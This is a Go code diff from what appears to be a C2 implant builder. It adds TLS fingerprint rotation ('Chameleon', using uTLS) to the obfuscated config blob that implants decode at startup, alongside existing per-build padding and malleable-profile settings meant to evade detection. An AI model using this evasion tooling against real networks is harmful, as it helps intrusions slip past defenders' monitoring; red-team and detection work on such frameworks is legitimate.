@@ -87,6 +87,10 @@ type agentConfigJSON struct {
 	// Pad is per-build random hex filler so the blob length varies per build
 	// even for identical configs. The agent ignores unknown fields.
 	Pad string `json:"pad,omitempty"`
+	// TLS ClientHello rotation (uTLS): "true"/"false" plus a profile name or
+	// "random". Empty profile keeps the agent's compiled default.
+	Chameleon        string `json:"chameleon,omitempty"`
+	ChameleonProfile string `json:"chameleon_profile,omitempty"`
 }
 
 // randomAESKey returns 32 random bytes suitable for AES-256.
@@ -147,6 +151,7 @@ func obfuscateBlobKeyed(plaintext, key []byte) string {
 // obfuscated runtime config block that the agent decodes during init().
 func marshalConfigBlobJSON(cfg ImplantConfig, profile MalleableProfile) []byte {
 	mtlsCertB64, mtlsKeyB64, mtlsCAB64 := mtlsBlobValues(cfg)
+	chameleon, chameleonProfile := cfg.tlsFingerprintBlobValues()
 	// Bootstrap-only compile: embed only what the agent needs to reach the
 	// server and register — its per-implant secret plus the initial C2
 	// endpoint. The full network config is then delivered over the wire at
@@ -187,6 +192,10 @@ func marshalConfigBlobJSON(cfg ImplantConfig, profile MalleableProfile) []byte {
 			MTLSCert: mtlsCertB64,
 			MTLSKey:  mtlsKeyB64,
 			MTLSCA:   mtlsCAB64,
+			// The TLS fingerprint is chosen at build time and applied before the
+			// first handshake, so it must ride in the bootstrap blob too.
+			Chameleon:        chameleon,
+			ChameleonProfile: chameleonProfile,
 		}
 		raw, err := json.Marshal(bc)
 		if err != nil {
@@ -292,6 +301,8 @@ func marshalConfigBlobJSON(cfg ImplantConfig, profile MalleableProfile) []byte {
 		JitterURI:               map[bool]string{true: "true", false: "false"}[cfg.JitterURI],
 		ParameterNames:          strings.Join(cfg.ParameterNames, "\n"),
 		RequestHeaderPool:       strings.Join(cfg.RequestHeaderPool, "\n"),
+		Chameleon:               chameleon,
+		ChameleonProfile:        chameleonProfile,
 	}
 	raw, err := json.Marshal(bc)
 	if err != nil {
